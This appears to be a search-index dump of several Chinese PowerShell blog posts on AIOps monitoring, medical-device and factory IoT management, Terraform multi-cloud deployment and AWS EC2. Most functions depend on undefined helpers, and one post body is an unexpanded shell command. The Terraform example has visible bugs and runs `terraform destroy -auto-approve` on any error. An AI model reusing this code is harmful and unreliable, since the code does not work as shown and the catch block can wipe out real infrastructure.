$insights $status.Diagnosis = $diagnosis } } else { $status.Status = &quot;Normal&quot; } $monitor.MonitorStatus[$type][$component.ID] = $status $monitor.Metrics[$type][$component.ID] = [PSCustomObject]@{ Metrics = $componentMetrics Health = $health Insights = $insights } } } # 生成报告 if ($ReportPath) { $report = Generate-MonitorReport ` -Monitor $monitor ` -Environment $environment $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新监控器状态 $monitor.EndTime = Get-Date return $monitor } catch { Write-Error &quot;智能监控失败：$_&quot; return $null }} 自动诊断接下来，创建一个用于自动诊断系统问题的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Diagnose-AIOpsIssues { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$DiagnosisID, [Parameter()] [string[]]$DiagnosisTypes, [Parameter()] [ValidateSet(&quot;RealTime&quot;, &quot;Scheduled&quot;, &quot;Manual&quot;)] [string]$DiagnosisMode = &quot;RealTime&quot;, [Parameter()] [hashtable]$DiagnosisConfig, [Parameter()] [string]$LogPath ) try { $diagnoser = [PSCustomObject]@{ DiagnosisID = $DiagnosisID StartTime = Get-Date DiagnosisStatus = @{} Issues = @() Solutions = @() } # 获取诊断配置 $config = Get-DiagnosisConfig -DiagnosisID $DiagnosisID # 执行诊断 foreach ($type in $DiagnosisTypes) { $diagnosis = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Issues = @() Solutions = @() } # 应用诊断配置 $typeConfig = Apply-DiagnosisConfig ` -Config $config ` -Type $type ` -Mode $DiagnosisMode ` -Settings $DiagnosisConfig $diagnosis.Config = $typeConfig # 检测问题 $issues = Detect-SystemIssues ` -Type $type ` -Config $typeConfig $diagnosis.Issues = $issues $diagnoser.Issues += $issues # 生成解决方案 $solutions = Generate-Solutions ` -Issues $issues ` -Config $typeConfig $diagnosis.Solutions = $solutions $diagnoser.Solutions += $solutions # 验证诊断结果 $validation = Validate-DiagnosisResults ` -Issues $issues ` -Solutions $solutions if ($validation.Success) { $diagnosis.Status = &quot;Resolved&quot; } else { $diagnosis.Status = &quot;Failed&quot; } $diagnoser.DiagnosisStatus[$type] = $diagnosis } # 记录诊断日志 if ($LogPath) { $diagnoser | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新诊断器状态 $diagnoser.EndTime = Get-Date return $diagnoser } catch { Write-Error &quot;自动诊断失败：$_&quot; return $null }} 预测性维护最后，创建一个用于管理预测性维护的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495function Manage-AIOpsMaintenance { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$MaintenanceID, [Parameter()] [string[]]$MaintenanceTypes, [Parameter()] [ValidateSet(&quot;Preventive&quot;, &quot;Predictive&quot;, &quot;Conditional&quot;)] [string]$MaintenanceMode = &quot;Predictive&quot;, [Parameter()] [hashtable]$MaintenanceRules, [Parameter()] [string]$ReportPath ) try { $manager = [PSCustomObject]@{ MaintenanceID = $MaintenanceID StartTime = Get-Date MaintenanceStatus = @{} Predictions = @{} Actions = @() } # 获取维护信息 $maintenance = Get-MaintenanceInfo -MaintenanceID $MaintenanceID # 管理维护 foreach ($type in $MaintenanceTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Rules = @{} Predictions = @{} Recommendations = @() } # 应用维护规则 $rules = Apply-MaintenanceRules ` -Maintenance $maintenance ` -Type $type ` -Mode $MaintenanceMode ` -Rules $MaintenanceRules $status.Rules = $rules # 生成预测 $predictions = Generate-MaintenancePredictions ` -Maintenance $maintenance ` -Type $type $status.Predictions = $predictions $manager.Predictions[$type] = $predictions # 生成建议 $recommendations = Generate-MaintenanceRecommendations ` -Predictions $predictions ` -Rules $rules if ($recommendations.Count -gt 0) { $status.Status = &quot;ActionRequired&quot; $status.Recommendations = $recommendations $manager.Actions += $recommendations } else { $status.Status = &quot;Normal&quot; } $manager.MaintenanceStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-MaintenanceReport ` -Manager $manager ` -Maintenance $maintenance $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;预测性维护管理失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理智能运维自动化的示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394# 智能监控系统状态$monitor = Monitor-AIOpsStatus -EnvironmentID &quot;ENV001&quot; ` -MonitorTypes @(&quot;System&quot;, &quot;Application&quot;, &quot;Network&quot;) ` -Metrics @(&quot;Performance&quot;, &quot;Availability&quot;, &quot;Security&quot;) ` -Thresholds @{ &quot;Performance&quot; = @{ &quot;CPUUsage&quot; = 80 &quot;MemoryUsage&quot; = 85 &quot;ResponseTime&quot; = 1000 } &quot;Availability&quot; = @{ &quot;Uptime&quot; = 99.9 &quot;ErrorRate&quot; = 0.1 &quot;RecoveryTime&quot; = 300 } &quot;Security&quot; = @{ &quot;ThreatScore&quot; = 70 &quot;VulnerabilityCount&quot; = 5 &quot;ComplianceScore&quot; = 90 } } ` -ReportPath &quot;C:\\Reports\\monitoring_status.json&quot; ` -AutoDiagnose# 自动诊断系统问题$diagnoser = Diagnose-AIOpsIssues -DiagnosisID &quot;DIAG001&quot; ` -DiagnosisTypes @(&quot;Performance&quot;, &quot;Security&quot;, &quot;Compliance&quot;) ` -DiagnosisMode &quot;RealTime&quot; ` -DiagnosisConfig @{ &quot;Performance&quot; = @{ &quot;Thresholds&quot; = @{ &quot;CPUUsage&quot; = 80 &quot;MemoryUsage&quot; = 85 &quot;DiskSpace&quot; = 90 } &quot;AnalysisPeriod&quot; = 3600 &quot;AlertThreshold&quot; = 3 } &quot;Security&quot; = @{ &quot;ThreatLevel&quot; = &quot;High&quot; &quot;ScanInterval&quot; = 1800 &quot;ActionThreshold&quot; = 2 } &quot;Compliance&quot; = @{ &quot;Standards&quot; = @(&quot;ISO27001&quot;, &quot;PCI-DSS&quot;) &quot;CheckInterval&quot; = 7200 &quot;ViolationThreshold&quot; = 1 } } ` -LogPath &quot;C:\\Logs\\diagnosis_results.json&quot;# 管理预测性维护$manager = Manage-AIOpsMaintenance -MaintenanceID &quot;MAINT001&quot; ` -MaintenanceTypes @(&quot;Hardware&quot;, &quot;Software&quot;, &quot;Infrastructure&quot;) ` -MaintenanceMode &quot;Predictive&quot; ` -MaintenanceRules @{ &quot;Hardware&quot; = @{ &quot;Thresholds&quot; = @{ &quot;Temperature&quot; = 75 &quot;Vibration&quot; = 4 &quot;PowerUsage&quot; = 90 } &quot;Intervals&quot; = @{ &quot;Inspection&quot; = 24 &quot;Service&quot; = 168 &quot;Replacement&quot; = 720 } } &quot;Software&quot; = @{ &quot;Thresholds&quot; = @{ &quot;Performance&quot; = 80 &quot;Errors&quot; = 10 &quot;Updates&quot; = 7 } &quot;Intervals&quot; = @{ &quot;Check&quot; = 12 &quot;Update&quot; = 72 &quot;Optimization&quot; = 240 } } &quot;Infrastructure&quot; = @{ &quot;Thresholds&quot; = @{ &quot;Bandwidth&quot; = 80 &quot;Latency&quot; = 100 &quot;Capacity&quot; = 85 } &quot;Intervals&quot; = @{ &quot;Monitor&quot; = 6 &quot;Scale&quot; = 24 &quot;Upgrade&quot; = 720 } } } ` -ReportPath &quot;C:\\Reports\\maintenance_management.json&quot; 最佳实践 实施智能监控 执行自动诊断 管理预测性维护 保持详细的运行记录 定期进行性能评估 实施维护策略 建立预警机制 保持系统文档更新","link":"/2024/11/08/powershell-ai-ops/"},{"title":"","text":"$(cat _posts/2024-11-11-powershell-error-handling.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段代码展示了PowerShell中的错误处理技术。错误处理是任何健壮脚本的关键部分，可以确保脚本在遇到异常情况时能够优雅地响应，而不是简单地失败。通过使用try/catch/finally块和错误变量，PowerShell提供了全面的错误管理能力。\\n/}pd}p’)","link":"/2024/11/11/powershell-error-handling/"},{"title":"PowerShell 技能连载 - 医疗设备管理系统","text":"在医疗环境中，设备管理对于确保医疗服务的质量和安全性至关重要。本文将介绍如何使用PowerShell构建一个医疗设备管理系统，包括设备监控、维护管理、数据采集等功能。 设备监控首先，让我们创建一个用于监控医疗设备的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103function Monitor-MedicalDevice { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$DeviceID, [Parameter()] [string[]]$Metrics, [Parameter()] [int]$Interval = 60, [Parameter()] [string]$LogPath, [Parameter()] [hashtable]$AlertThresholds ) try { $monitor = [PSCustomObject]@{ DeviceID = $DeviceID StartTime = Get-Date Readings = @() Alerts = @() } while ($true) { $reading = [PSCustomObject]@{ Timestamp = Get-Date Metrics = @{} Status = &quot;Normal&quot; } # 获取设备状态 $deviceStatus = Get-DeviceStatus -DeviceID $DeviceID # 检查关键指标 foreach ($metric in $Metrics) { $value = Get-DeviceMetric -DeviceID $DeviceID -Metric $metric $reading.Metrics[$metric] = $value # 检查告警阈值 if ($AlertThresholds -and $AlertThresholds.ContainsKey($metric)) { $threshold = $AlertThresholds[$metric] if ($value -gt $threshold.Max) { $reading.Status = &quot;Warning&quot; $monitor.Alerts += [PSCustomObject]@{ Time = Get-Date Type = &quot;HighValue&quot; Metric = $metric Value = $value Threshold = $threshold.Max } } if ($value -lt $threshold.Min) { $reading.Status = &quot;Warning&quot; $monitor.Alerts += [PSCustomObject]@{ Time = Get-Date Type = &quot;LowValue&quot; Metric = $metric Value = $value Threshold = $threshold.Min } } } } # 检查设备状态 if ($deviceStatus.Status -ne &quot;Normal&quot;) { $reading.Status = $deviceStatus.Status $monitor.Alerts += [PSCustomObject]@{ Time = Get-Date Type = &quot;DeviceStatus&quot; Status = $deviceStatus.Status Details = $deviceStatus.Details } } $monitor.Readings += $reading # 记录数据 if ($LogPath) { $reading | ConvertTo-Json | Out-File -FilePath $LogPath -Append } # 处理告警 if ($reading.Status -ne &quot;Normal&quot;) { Send-MedicalAlert -Alert $monitor.Alerts[-1] } Start-Sleep -Seconds $Interval } return $monitor } catch { Write-Error &quot;设备监控失败：$_&quot; return $null }} 维护管理接下来，创建一个用于管理医疗设备维护的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182function Manage-DeviceMaintenance { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$DeviceID, [Parameter(Mandatory = $true)] [ValidateSet(&quot;Routine&quot;, &quot;Preventive&quot;, &quot;Corrective&quot;)] [string]$MaintenanceType, [Parameter()] [string]$Technician, [Parameter()] [string]$Notes, [Parameter()] [switch]$Force ) try { $maintenance = [PSCustomObject]@{ DeviceID = $DeviceID Type = $MaintenanceType StartTime = Get-Date Technician = $Technician Notes = $Notes Status = &quot;InProgress&quot; Steps = @() } # 检查设备状态 $deviceStatus = Get-DeviceStatus -DeviceID $DeviceID if (-not $Force -and $deviceStatus.Status -ne &quot;Ready&quot;) { throw &quot;设备当前状态不适合进行维护：$($deviceStatus.Status)&quot; } # 获取维护步骤 $steps = Get-MaintenanceSteps -DeviceID $DeviceID -Type $MaintenanceType foreach ($step in $steps) { $stepResult = [PSCustomObject]@{ StepID = $step.ID Description = $step.Description StartTime = Get-Date Status = &quot;InProgress&quot; } try { # 执行维护步骤 $result = Invoke-MaintenanceStep -DeviceID $DeviceID ` -StepID $step.ID ` -Parameters $step.Parameters $stepResult.Status = &quot;Success&quot; $stepResult.Result = $result } catch { $stepResult.Status = &quot;Failed&quot; $stepResult.Error = $_.Exception.Message throw } finally { $stepResult.EndTime = Get-Date $maintenance.Steps += $stepResult } } # 更新维护状态 $maintenance.Status = &quot;Completed&quot; $maintenance.EndTime = Get-Date # 记录维护历史 Add-MaintenanceHistory -Maintenance $maintenance return $maintenance } catch { Write-Error &quot;设备维护失败：$_&quot; return $null }} 数据采集最后，创建一个用于采集医疗设备数据的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Collect-DeviceData { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$DeviceID, [Parameter(Mandatory = $true)] [DateTime]$StartTime, [Parameter(Mandatory = $true)] [DateTime]$EndTime, [Parameter()] [string[]]$DataTypes, [Parameter()] [string]$ExportPath, [Parameter()] [ValidateSet(&quot;CSV&quot;, &quot;JSON&quot;, &quot;Excel&quot;)] [string]$ExportFormat = &quot;CSV&quot; ) try { $collection = [PSCustomObject]@{ DeviceID = $DeviceID StartTime = $StartTime EndTime = $EndTime DataTypes = $DataTypes Records = @() Summary = @{} } # 获取设备数据 $data = Get-DeviceData -DeviceID $DeviceID ` -StartTime $StartTime ` -EndTime $EndTime ` -DataTypes $DataTypes foreach ($record in $data) { $collection.Records += [PSCustomObject]@{ Timestamp = $record.Timestamp Data = $record.Data Quality = $record.Quality } } # 生成数据摘要 foreach ($dataType in $DataTypes) { $typeData = $collection.Records | Where-Object { $_.Data.ContainsKey($dataType) } $collection.Summary[$dataType] = [PSCustomObject]@{ Count = $typeData.Count MinValue = ($typeData.Data[$dataType] | Measure-Object -Minimum).Minimum MaxValue = ($typeData.Data[$dataType] | Measure-Object -Maximum).Maximum Average = ($typeData.Data[$dataType] | Measure-Object -Average).Average Quality = ($typeData.Quality | Measure-Object -Average).Average } } # 导出数据 if ($ExportPath) { switch ($ExportFormat) { &quot;CSV&quot; { $collection.Records | Export-Csv -Path $ExportPath -NoTypeInformation } &quot;JSON&quot; { $collection | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath } &quot;Excel&quot; { $excel = New-ExcelWorkbook $sheet = $excel.Worksheets.Add(&quot;DeviceData&quot;) # 写入数据 $row = 1 foreach ($record in $collection.Records) { $sheet.Cells[$row, 1].Value = $record.Timestamp $col = 2 foreach ($key in $record.Data.Keys) { $sheet.Cells[$row, $col].Value = $record.Data[$key] $col++ } $row++ } $excel.SaveAs($ExportPath) } } } return $collection } catch { Write-Error &quot;数据采集失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理医疗设备的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# 配置设备监控参数$monitorConfig = @{ DeviceID = &quot;MRI001&quot; Metrics = @(&quot;Temperature&quot;, &quot;Pressure&quot;, &quot;Power&quot;) Interval = 30 LogPath = &quot;C:\\Logs\\mri001_monitor.json&quot; AlertThresholds = @{ &quot;Temperature&quot; = @{ Min = 15 Max = 25 } &quot;Pressure&quot; = @{ Min = 0 Max = 100 } &quot;Power&quot; = @{ Min = 0 Max = 95 } }}# 启动设备监控$monitor = Start-Job -ScriptBlock { param($config) Monitor-MedicalDevice -DeviceID $config.DeviceID ` -Metrics $config.Metrics ` -Interval $config.Interval ` -LogPath $config.LogPath ` -AlertThresholds $config.AlertThresholds} -ArgumentList $monitorConfig# 执行设备维护$maintenance = Manage-DeviceMaintenance -DeviceID &quot;MRI001&quot; ` -MaintenanceType &quot;Preventive&quot; ` -Technician &quot;John Smith&quot; ` -Notes &quot;定期维护检查&quot;# 采集设备数据$data = Collect-DeviceData -DeviceID &quot;MRI001&quot; ` -StartTime (Get-Date).AddDays(-7) ` -EndTime (Get-Date) ` -DataTypes @(&quot;Temperature&quot;, &quot;Pressure&quot;, &quot;Power&quot;) ` -ExportPath &quot;C:\\Data\\mri001_data.xlsx&quot; ` -ExportFormat &quot;Excel&quot; 最佳实践 实施实时监控和告警 建立完整的维护计划 保持详细的维护记录 定期进行数据备份 实施访问控制策略 建立应急响应机制 定期进行系统校准 保持设备文档更新","link":"/2024/11/13/powershell-medical-device-management/"},{"title":"PowerShell 技能连载 - Terraform 多云环境集成与自动化","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455function Invoke-TerraformMultiCloud { [CmdletBinding(SupportsShouldProcess=$true)] param( [Parameter(Mandatory=$true)] [ValidateSet('Azure','AWS','GCP')] [string[]]$CloudProviders, [string]$TfWorkingDir = '$PSScriptRoot/terraform' ) $stateReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' DeploymentStatus = @{} ResourceCounts = @{} CrossCloudDependencies = @() } try { # 初始化多供应商terraform工作区 $CloudProviders | ForEach-Object { if ($PSCmdlet.ShouldProcess(&quot;Initialize $_ provider&quot;)) { terraform -chdir=$TfWorkingDir init -backend-config=&quot;$_backend.hcl&quot; } } # 执行跨云资源编排 $planOutput = terraform -chdir=$TfWorkingDir plan -out=multicloud.tfplan $stateReport.DeploymentStatus['Plan'] = $planOutput -match 'No changes' ? 'Stable' : 'Pending' # 自动化应用配置 if ($planOutput -match 'to add') { $applyOutput = terraform -chdir=$TfWorkingDir apply -auto-approve multicloud.tfplan $stateReport.DeploymentStatus['Apply'] = $applyOutput -match 'Apply complete' ? 'Success' : 'Failed' } # 获取跨云资源状态 $tfState = terraform -chdir=$TfWorkingDir show -json | ConvertFrom-Json $stateReport.ResourceCounts = $tfState.resources | Group-Object provider_name | ForEach-Object {@{$_.Name = $_.Count}} # 分析云间依赖关系 $stateReport.CrossCloudDependencies = $tfState.resources | Where-Object { $_.depends_on -match 'aws_|azurerm_' } | Select-Object type, provider } catch { Write-Error &quot;多云部署失败: $_&quot; terraform -chdir=$TfWorkingDir destroy -auto-approve } # 生成基础设施即代码报告 $stateReport | Export-Csv -Path &quot;$env:TEMP/MultiCloudReport_$(Get-Date -Format yyyyMMdd).csv&quot; return $stateReport} 核心功能： 多云供应商统一编排 基础设施配置自动化管理 跨云依赖关系可视化 部署状态实时跟踪 应用场景： 混合云资源统一管理 跨云平台灾备方案实施 多云成本优化分析 基础设施合规检查","link":"/2024/11/12/powershell-terraform-multi-cloud/"},{"title":"PowerShell 技能连载 - 制造业物联网管理","text":"在制造业物联网领域，设备管理和数据采集对于确保生产效率和产品质量至关重要。本文将介绍如何使用PowerShell构建一个制造业物联网管理系统，包括设备监控、数据采集、预测性维护等功能。 设备监控首先，让我们创建一个用于监控物联网设备的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111function Monitor-IoTDevices { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$FactoryID, [Parameter()] [string[]]$DeviceTypes, [Parameter()] [string[]]$Metrics, [Parameter()] [hashtable]$Thresholds, [Parameter()] [string]$ReportPath, [Parameter()] [switch]$AutoAlert ) try { $monitor = [PSCustomObject]@{ FactoryID = $FactoryID StartTime = Get-Date Devices = @{} Metrics = @{} Alerts = @() } # 获取工厂信息 $factory = Get-FactoryInfo -FactoryID $FactoryID # 监控设备 foreach ($type in $DeviceTypes) { $monitor.Devices[$type] = @{} $monitor.Metrics[$type] = @{} foreach ($device in $factory.Devices[$type]) { $deviceStatus = [PSCustomObject]@{ DeviceID = $device.ID Status = &quot;Unknown&quot; Metrics = @{} Health = 0 Alerts = @() } # 获取设备指标 $deviceMetrics = Get-DeviceMetrics ` -Device $device ` -Metrics $Metrics $deviceStatus.Metrics = $deviceMetrics # 评估设备健康状态 $health = Calculate-DeviceHealth ` -Metrics $deviceMetrics ` -Thresholds $Thresholds $deviceStatus.Health = $health # 检查设备告警 $alerts = Check-DeviceAlerts ` -Metrics $deviceMetrics ` -Health $health if ($alerts.Count -gt 0) { $deviceStatus.Status = &quot;Warning&quot; $deviceStatus.Alerts = $alerts $monitor.Alerts += $alerts # 自动告警 if ($AutoAlert) { Send-DeviceAlerts ` -Device $device ` -Alerts $alerts } } else { $deviceStatus.Status = &quot;Normal&quot; } $monitor.Devices[$type][$device.ID] = $deviceStatus $monitor.Metrics[$type][$device.ID] = [PSCustomObject]@{ Metrics = $deviceMetrics Health = $health Alerts = $alerts } } } # 生成报告 if ($ReportPath) { $report = Generate-DeviceReport ` -Monitor $monitor ` -Factory $factory $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新监控器状态 $monitor.EndTime = Get-Date return $monitor } catch { Write-Error &quot;设备监控失败：$_&quot; return $null }} 数据采集接下来，创建一个用于采集物联网数据的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Collect-IoTData { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$CollectionID, [Parameter()] [string[]]$DataTypes, [Parameter()] [ValidateSet(&quot;RealTime&quot;, &quot;Batch&quot;, &quot;Scheduled&quot;)] [string]$CollectionMode = &quot;RealTime&quot;, [Parameter()] [hashtable]$CollectionConfig, [Parameter()] [string]$LogPath ) try { $collector = [PSCustomObject]@{ CollectionID = $CollectionID StartTime = Get-Date Collections = @{} DataPoints = @() Errors = @() } # 获取采集配置 $config = Get-CollectionConfig -CollectionID $CollectionID # 采集数据 foreach ($type in $DataTypes) { $collection = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Data = @() Statistics = @{} } # 应用采集配置 $typeConfig = Apply-CollectionConfig ` -Config $config ` -Type $type ` -Mode $CollectionMode ` -Settings $CollectionConfig $collection.Config = $typeConfig # 采集数据点 $dataPoints = Gather-DataPoints ` -Type $type ` -Config $typeConfig $collection.Data = $dataPoints $collector.DataPoints += $dataPoints # 计算统计数据 $statistics = Calculate-DataStatistics ` -Data $dataPoints ` -Type $type $collection.Statistics = $statistics # 验证数据质量 $errors = Validate-DataQuality ` -Data $dataPoints ` -Config $typeConfig if ($errors.Count -gt 0) { $collection.Status = &quot;Error&quot; $collector.Errors += $errors } else { $collection.Status = &quot;Success&quot; } $collector.Collections[$type] = $collection } # 记录采集日志 if ($LogPath) { $collector | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新采集器状态 $collector.EndTime = Get-Date return $collector } catch { Write-Error &quot;数据采集失败：$_&quot; return $null }} 预测性维护最后，创建一个用于管理预测性维护的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495function Manage-PredictiveMaintenance { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$MaintenanceID, [Parameter()] [string[]]$MaintenanceTypes, [Parameter()] [ValidateSet(&quot;Preventive&quot;, &quot;Predictive&quot;, &quot;Conditional&quot;)] [string]$MaintenanceMode = &quot;Predictive&quot;, [Parameter()] [hashtable]$MaintenanceRules, [Parameter()] [string]$ReportPath ) try { $manager = [PSCustomObject]@{ MaintenanceID = $MaintenanceID StartTime = Get-Date MaintenanceStatus = @{} Predictions = @{} Actions = @() } # 获取维护信息 $maintenance = Get-MaintenanceInfo -MaintenanceID $MaintenanceID # 管理维护 foreach ($type in $MaintenanceTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Rules = @{} Predictions = @{} Recommendations = @() } # 应用维护规则 $rules = Apply-MaintenanceRules ` -Maintenance $maintenance ` -Type $type ` -Mode $MaintenanceMode ` -Rules $MaintenanceRules $status.Rules = $rules # 生成预测 $predictions = Generate-MaintenancePredictions ` -Maintenance $maintenance ` -Type $type $status.Predictions = $predictions $manager.Predictions[$type] = $predictions # 生成建议 $recommendations = Generate-MaintenanceRecommendations ` -Predictions $predictions ` -Rules $rules if ($recommendations.Count -gt 0) { $status.Status = &quot;ActionRequired&quot; $status.Recommendations = $recommendations $manager.Actions += $recommendations } else { $status.Status = &quot;Normal&quot; } $manager.MaintenanceStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-MaintenanceReport ` -Manager $manager ` -Maintenance $maintenance $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;预测性维护管理失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理制造业物联网的示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# 监控物联网设备$monitor = Monitor-IoTDevices -FactoryID &quot;FACT001&quot; ` -DeviceTypes @(&quot;PLC&quot;, &quot;Robot&quot;, &quot;Sensor&quot;) ` -Metrics @(&quot;Temperature&quot;, &quot;Pressure&quot;, &quot;Vibration&quot;) ` -Thresholds @{ &quot;Temperature&quot; = @{ &quot;Min&quot; = 20 &quot;Max&quot; = 80 } &quot;Pressure&quot; = @{ &quot;Min&quot; = 0 &quot;Max&quot; = 100 } &quot;Vibration&quot; = @{ &quot;Max&quot; = 5 } } ` -ReportPath &quot;C:\\Reports\\device_monitoring.json&quot; ` -AutoAlert# 采集物联网数据$collector = Collect-IoTData -CollectionID &quot;COLL001&quot; ` -DataTypes @(&quot;Production&quot;, &quot;Quality&quot;, &quot;Energy&quot;) ` -CollectionMode &quot;RealTime&quot; ` -CollectionConfig @{ &quot;Production&quot; = @{ &quot;Interval&quot; = 1 &quot;Metrics&quot; = @(&quot;Output&quot;, &quot;Efficiency&quot;, &quot;Downtime&quot;) } &quot;Quality&quot; = @{ &quot;Interval&quot; = 5 &quot;Metrics&quot; = @(&quot;Defects&quot;, &quot;Accuracy&quot;, &quot;Consistency&quot;) } &quot;Energy&quot; = @{ &quot;Interval&quot; = 15 &quot;Metrics&quot; = @(&quot;Consumption&quot;, &quot;Efficiency&quot;, &quot;Cost&quot;) } } ` -LogPath &quot;C:\\Logs\\data_collection.json&quot;# 管理预测性维护$manager = Manage-PredictiveMaintenance -MaintenanceID &quot;MAINT001&quot; ` -MaintenanceTypes @(&quot;Equipment&quot;, &quot;Tooling&quot;, &quot;System&quot;) ` -MaintenanceMode &quot;Predictive&quot; ` -MaintenanceRules @{ &quot;Equipment&quot; = @{ &quot;Thresholds&quot; = @{ &quot;Temperature&quot; = 75 &quot;Vibration&quot; = 4 &quot;Pressure&quot; = 90 } &quot;Intervals&quot; = @{ &quot;Inspection&quot; = 24 &quot;Service&quot; = 168 &quot;Replacement&quot; = 720 } } &quot;Tooling&quot; = @{ &quot;Thresholds&quot; = @{ &quot;Wear&quot; = 80 &quot;Accuracy&quot; = 95 &quot;Lifecycle&quot; = 1000 } &quot;Intervals&quot; = @{ &quot;Inspection&quot; = 48 &quot;Service&quot; = 240 &quot;Replacement&quot; = 1000 } } &quot;System&quot; = @{ &quot;Thresholds&quot; = @{ &quot;Performance&quot; = 90 &quot;Reliability&quot; = 95 &quot;Efficiency&quot; = 85 } &quot;Intervals&quot; = @{ &quot;Check&quot; = 12 &quot;Optimization&quot; = 72 &quot;Upgrade&quot; = 720 } } } ` -ReportPath &quot;C:\\Reports\\maintenance_management.json&quot; 最佳实践 监控设备状态 采集实时数据 实施预测性维护 保持详细的运行记录 定期进行性能评估 实施维护策略 建立预警机制 保持系统文档更新","link":"/2024/11/15/powershell-manufacturing-iot/"},{"title":"PowerShell 技能连载 - AWS EC2 集成","text":"在云计算时代，将PowerShell与AWS EC2集成可以为云服务器管理带来强大的自动化能力。本文将介绍如何使用PowerShell构建一个AWS EC2管理系统，包括实例管理、安全组配置和监控分析等功能。 实例管理首先，让我们创建一个用于管理EC2实例的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293function Manage-EC2Instances { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$InstanceID, [Parameter()] [string[]]$InstanceTypes, [Parameter()] [ValidateSet(&quot;Launch&quot;, &quot;Stop&quot;, &quot;Terminate&quot;)] [string]$OperationMode = &quot;Launch&quot;, [Parameter()] [hashtable]$InstanceConfig, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ InstanceID = $InstanceID StartTime = Get-Date InstanceStatus = @{} Operations = @{} Issues = @() } # 获取实例配置 $config = Get-InstanceConfig -InstanceID $InstanceID # 管理实例 foreach ($type in $InstanceTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用实例配置 $typeConfig = Apply-InstanceConfig ` -Config $config ` -Type $type ` -Mode $OperationMode ` -Settings $InstanceConfig $status.Config = $typeConfig # 执行实例操作 $operations = Execute-InstanceOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 检查实例问题 $issues = Check-InstanceIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新实例状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $manager.InstanceStatus[$type] = $status } # 记录实例日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;实例管理失败：$_&quot; return $null }} 安全组配置接下来，创建一个用于管理安全组配置的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Configure-EC2SecurityGroups { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$SecurityGroupID, [Parameter()] [string[]]$SecurityGroupTypes, [Parameter()] [ValidateSet(&quot;Web&quot;, &quot;Database&quot;, &quot;Application&quot;)] [string]$SecurityGroupMode = &quot;Web&quot;, [Parameter()] [hashtable]$SecurityGroupConfig, [Parameter()] [string]$ReportPath ) try { $configurator = [PSCustomObject]@{ SecurityGroupID = $SecurityGroupID StartTime = Get-Date SecurityGroupStatus = @{} Configurations = @{} Issues = @() } # 获取安全组配置 $config = Get-SecurityGroupConfig -SecurityGroupID $SecurityGroupID # 管理安全组 foreach ($type in $SecurityGroupTypes) { 